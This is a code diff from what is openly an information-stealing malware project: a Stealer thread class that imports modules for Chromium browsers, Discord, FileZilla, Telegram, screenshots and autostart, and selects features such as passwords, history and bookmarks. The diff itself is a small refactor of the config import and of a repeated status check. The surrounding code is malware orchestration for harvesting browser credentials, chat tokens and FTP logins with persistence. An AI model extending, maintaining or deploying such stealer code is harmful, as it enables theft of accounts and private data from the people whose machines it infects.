@@ -4,7 +4,8 @@ from threading import Thread
 from os import path, makedirs
 
 from .modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram
-from .utils import Autostart, config, Sender
+from .helpers.config import MultistealerConfig
+from .utils import Autostart, Sender
 from .enums import Features, Utils
 
 
@@ -18,7 +19,7 @@ class Stealer(Thread):
         self.errors = True if Utils.errors in utils else False
         self.autostart = True if Utils.autostart in utils else False
 
-        self.config = config.MultistealerConfig()
+        self.config = MultistealerConfig()
 
         browser_functions = [module for module in [
             Features.passwords,
@@ -27,6 +28,7 @@ class Stealer(Thread):
             Features.history,
             Features.bookmarks
         ] if module in features or Features.all in features]
+        browser_statuses = True if len(browser_functions) > 0 else False
 
         self.methods = [
             {
@@ -37,7 +39,7 @@ class Stealer(Thread):
                     browser_functions,
                     self.errors
                 ),
-                "status": True if len(browser_functions) > 0 else False
+                "status": browser_statuses
             },
             {
                 "object": Chromium(
@@ -47,7 +49,7 @@ class Stealer(Thread):
                     browser_functions,
                     self.errors
                 ),
-                "status": True if len(browser_functions) > 0 else False
+                "status": browser_statuses
             },
             {
                 "object": Chromium(
@@ -57,7 +59,7 @@ class Stealer(Thread):
                     browser_functions,
                     self.errors
                 ),
-                "status": True if len(browser_functions) > 0 else False
+                "status": browser_statuses
             },
             {
                 "object": Chromium(
@@ -67,7 +69,7 @@ class Stealer(Thread):
                     browser_functions,
                     self.errors
                 ),
-                "status": True if len(browser_functions) > 0 else False
+                "status": browser_statuses
             },
             {
                 "object": Chromium(
@@ -77,7 +79,7 @@ class Stealer(Thread):
                     browser_functions,
                     self.errors
                 ),
-                "status": True if len(browser_functions) > 0 else False
+                "status": browser_statuses
             },
             {
                 "object": Chromium(
@@ -87,7 +89,7 @@ class Stealer(Thread):
                     browser_functions,
                     self.errors
                 ),
-                "status": True if len(browser_functions) > 0 else False
+                "status": browser_statuses
             },
             {
                 "object": System(
